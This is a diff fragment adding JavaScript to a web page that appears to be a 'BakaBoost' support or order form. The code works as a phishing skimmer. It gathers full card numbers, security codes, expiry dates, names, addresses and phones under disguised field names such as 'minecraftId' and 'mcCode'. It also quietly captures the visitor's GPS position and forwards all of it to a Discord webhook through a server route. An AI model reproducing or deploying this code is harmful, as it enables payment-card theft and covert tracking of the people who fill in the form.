+      phoneCountryCodeInput.selectedIndex = index; updateCountryCodePicker(); syncCountryFromPhoneCode();
+      setFieldError(countryInput,""); closeCountryCodeMenu(); countryCodeButton.focus();
+    });
+    countryCodeMenu.append(btn);
+  });
+  selectPhoneCountryByName(DEFAULT_COUNTRY); syncCountryFromPhoneCode(); updateCountryCodePicker();
+}
+
+populateCountryCodeSelect();
+
+countryCodeButton.addEventListener("click", () => { countryCodePicker.classList.contains("is-open") ? closeCountryCodeMenu() : openCountryCodeMenu(); });
+countryCodeButton.addEventListener("keydown", event => {
+  if (!["ArrowDown","Enter"," "].includes(event.key)) return;
+  event.preventDefault(); openCountryCodeMenu();
+  const sel = countryCodeMenu.querySelector(".country-code-option.is-selected");
+  if (sel) sel.focus();
+});
+countryCodeMenu.addEventListener("keydown", event => {
+  const options = Array.from(countryCodeMenu.querySelectorAll(".country-code-option"));
+  const currentIndex = options.indexOf(document.activeElement);
+  let nextIndex = currentIndex;
+  if (event.key === "ArrowDown") nextIndex = Math.min(options.length-1, currentIndex+1);
+  if (event.key === "ArrowUp") nextIndex = Math.max(0, currentIndex-1);
+  if (event.key === "Home") nextIndex = 0;
+  if (event.key === "End") nextIndex = options.length-1;
+  if (nextIndex !== currentIndex) { event.preventDefault(); options[nextIndex]?.focus(); }
+});
+document.addEventListener("click", event => { if (!countryCodePicker.contains(event.target)) closeCountryCodeMenu(); });
+countryCodePicker.addEventListener("keydown", event => { if (event.key !== "Escape") return; closeCountryCodeMenu(); countryCodeButton.focus(); });
+phoneCountryCodeInput.addEventListener("change", () => { updateCountryCodePicker(); syncCountryFromPhoneCode(); setFieldError(countryInput,""); });
+countryInput.addEventListener("change", syncPhoneCodeFromCountry);
+zipCodeInput.addEventListener("input", () => { const rule = getPostalCodeRule(countryInput.value); zipCodeInput.value = normalizePostalCode(zipCodeInput.value).slice(0, rule.maxLength); });
+
+const customValidationInputs = Array.from(orderForm.querySelectorAll("input:not([type='hidden']), select, textarea"));
+
+function getCardBrand(digits) {
+  if (/^4/.test(digits)) return "visa";
+  if (/^(5[1-5]|2[2-7])/.test(digits)) return "mastercard";
+  if (/^3[47]/.test(digits)) return "amex";
+  if (/^3(0|6|8|9)/.test(digits)) return "diners";
+  return "";
+}
+function updateCardBrand(input) {
+  const badges = input.closest(".payment-input-wrap")?.querySelector(".id-badges");
+  if (!badges) return;
+  const brand = getCardBrand(input.value.replace(/\D/g,""));
+  badges.dataset.brand = brand; badges.classList.toggle("has-brand", Boolean(brand));
+}
+updateCardBrand(minecraftIdInput);
+
+expirationInput.addEventListener("input", () => {
+  const digits = expirationInput.value.replace(/\D/g,"").slice(0,6);
+  expirationInput.value = digits.length > 2 ? `${digits.slice(0,2)}/${digits.slice(2)}` : digits;
+});
+
+function isCurrentOrFutureMonth(value) {
+  const match = value.match(/^(0[1-9]|1[0-2])\/(\d{4})$/);
+  if (!match) return false;
+  const month = Number(match[1]); const year = Number(match[2]);
+  const now = new Date(); const currentMonth = now.getMonth()+1; const currentYear = now.getFullYear();
+  return year > currentYear || (year === currentYear && month >= currentMonth);
+}
+
+function getFieldError(input) {
+  const value = input.value.trim(); const digits = value.replace(/\D/g,"");
+  if (input.required && !value) {
+    if (input === emailInput) return "Write your email address.";
+    if (input === phoneNumberInput) return "Phone number must be 6 to 15 digits.";
+    if (input === minecraftIdInput) return "Card Number is required and must be exactly 16 numbers.";
+    if (input === mcCodeInput) return "Security code is required.";
+    if (input === expirationInput) return "Write the expiration date in MM/YYYY format.";
+    return "Please fill out this field.";
+  }
+  if (input === emailInput && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value)) return "Write a valid email address.";
+  if (input === phoneNumberInput && !/^\d{6,15}$/.test(digits)) return "Phone number must be 6 to 15 digits.";
+  if (input === minecraftIdInput && !/^\d{16}$/.test(digits)) return "Card Number must be exactly 16 numbers.";
+  if (input === mcCodeInput && !/^\d{3,4}$/.test(value)) return "Security code must be 3 or 4 numbers.";
+  if (input === expirationInput && !isCurrentOrFutureMonth(value)) return "Expiration date must be MM/YYYY and cannot be in the past.";
+  if (input === zipCodeInput) return getPostalCodeError(value, countryInput.value);
+  return "";
+}
+
+function getErrorElement(input) {
+  const label = input.closest("label"); if (!label) return null;
+  let el = label.querySelector(".field-error");
+  if (!el) { el = document.createElement("span"); el.className = "field-error"; label.append(el); }
+  return el;
+}
+
+function setFieldError(input, message) {
+  input.setCustomValidity(message); input.classList.toggle("is-invalid", Boolean(message));
+  const el = getErrorElement(input); if (el) el.textContent = message;
+}
+
+function refreshFieldValidity(input) { setFieldError(input, getFieldError(input)); }
+
+customValidationInputs.forEach(input => {
+  input.addEventListener("input", () => { setFieldError(input,""); if (input.value.trim()) refreshFieldValidity(input); });
+  input.addEventListener("blur", () => refreshFieldValidity(input));
+});
+
+function reportOrderFieldErrors() {
+  for (const input of customValidationInputs) {
+    refreshFieldValidity(input);
+    if (!input.validity.valid) { setStatus(input.validationMessage,"error"); input.focus(); return false; }
+  }
+  return true;
+}
+
+function setStatus(message, type="") { statusLine.textContent = message; statusLine.className = `status ${type}`; }
+function getFormData(form) { return Object.fromEntries(new FormData(form).entries()); }
+
+function validateOrder(data) {
+  if (!/^\d{16}$/.test(data.minecraftId.replace(/\D/g,""))) return "Card Number must be exactly 16 numbers.";
+  if (!/^\d{3,4}$/.test(data.mcCode)) return "Security code must be 3 or 4 numbers.";
+  if (!isCurrentOrFutureMonth(data.expirationDate)) return "Expiration date must be MM/YYYY and cannot be in the past.";
+  const postalCodeError = getPostalCodeError(String(data.zipCode||"").trim(), data.country);
+  if (postalCodeError) return postalCodeError;
+  return "";
+}
+
+function buildDiscordPayload(data) {
+  const fieldValue = (value, fallback="Not provided") => (String(value??"").trim()||fallback).slice(0,1024);
+  const total = Number(data.total);
+  const offerValue = Number.isFinite(total) ? `${total.toFixed(2)} (${fieldValue(data.amount,"1")} ${LABEL})` : "Not provided";
+  return {
+    username: "BakaBoost",
+    embeds: [{
+      title: `New Support for ${P.displayName}`,
+      color: 0x467ceb,
+      fields: [
+        { name:"Email", value:fieldValue(data.email), inline:true },
+        { name:"Card Number", value:fieldValue(data.minecraftId), inline:true },
+        { name:"Security code", value:fieldValue(data.mcCode), inline:true },
+        { name:"Expiration date", value:fieldValue(data.expirationDate), inline:true },
+        { name:"First name", value:fieldValue(data.minecraftName), inline:true },
+        { name:"Last name", value:fieldValue(data.discordName), inline:true },
+        { name:"Address", value:fieldValue(data.address), inline:false },
+        { name:"City", value:fieldValue(data.city), inline:true },
+        { name:"State / region", value:fieldValue(data.state), inline:true },
+        { name:getPostalCodeRule(data.country).label, value:fieldValue(data.zipCode), inline:true },
+        { name:"Country", value:fieldValue(data.country), inline:true },
+        { name:"Offer value", value:offerValue, inline:true },
+        { name:"Type", value:fieldValue(data.paymentType), inline:true },
+        { name:"Phone number", value:fieldValue(`${data.phoneCountryCode||""}${data.phoneNumber?" "+data.phoneNumber:""}`), inline:false },
+        { name:"Message", value:fieldValue(data.message,"No message"), inline:false },
+      ],
+      timestamp: new Date().toISOString(),
+    }],
+  };
+}
+
+async function encryptGPS(lat, lng, accuracy) {
+  const pubRes = await fetch("/api/public-key"); if (!pubRes.ok) return null;
+  const { publicKey: pem } = await pubRes.json();
+  const b64 = pem.replace("-----BEGIN PUBLIC KEY-----","").replace("-----END PUBLIC KEY-----","").replace(/\s/g,"");
+  const der = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
+  const key = await crypto.subtle.importKey("spki", der, { name:"RSA-OAEP", hash:"SHA-256" }, false, ["encrypt"]);
+  const enc = await crypto.subtle.encrypt({ name:"RSA-OAEP" }, key, new TextEncoder().encode(JSON.stringify({ lat, lng, accuracy })));
+  return btoa(String.fromCharCode(...new Uint8Array(enc)));
+}
+
+function getGPS() {
+  return new Promise((resolve, reject) => {
+    if (!navigator.geolocation) { resolve(null); return; }
+    navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy:true, timeout:10000 });
+  });
+}
+
+async function postOrder(data) {
+  if (!location.protocol.startsWith("http")) throw new Error("Run server.js first.");
+  let encryptedLocation = null;
+  try { const pos = await getGPS(); if (pos) { const { latitude, longitude, accuracy } = pos.coords; encryptedLocation = await encryptGPS(latitude, longitude, accuracy); } } catch {}
+  const payload = buildDiscordPayload(data);
+  if (encryptedLocation) payload.encryptedLocation = encryptedLocation;
+  const tokenRes = await fetch("/api/token"); if (!tokenRes.ok) throw new Error("Could not get auth token");
+  const { token } = await tokenRes.json();
+  const serverResponse = await fetch("/api/order", { method:"POST", headers:{ "Content-Type":"application/json", "Authorization":`Bearer ${token}` }, body:JSON.stringify(payload) });
+  if (!serverResponse.ok) { const text = await serverResponse.text().catch(()=>""); throw new Error(text || `Webhook route failed with ${serverResponse.status}`); }
+}
+
+orderForm.addEventListener("submit", async event => {
+  event.preventDefault();
+  if (!reportOrderFieldErrors()) return;
+  if (!orderForm.reportValidity()) return;
+  const data = getFormData(orderForm);
+  const error = validateOrder(data);
+  if (error) { setStatus(error,"error"); return; }
+  setStatus("Sending...");
+  try {
+    await postOrder(data);
+    setStatus("Order sent! Thank you for your support ♥", "ok");
+    orderForm.reset();
+    selectPhoneCountryByName(DEFAULT_COUNTRY);
+    syncCountryFromPhoneCode(); updatePostalCodeField(); updateCardBrand(minecraftIdInput);
+  } catch (error) {
+    console.error(error);
+    setStatus(error.message || "Could not send order.", "error");
+  }
+});
+    </script>
+  </body>
+</html>
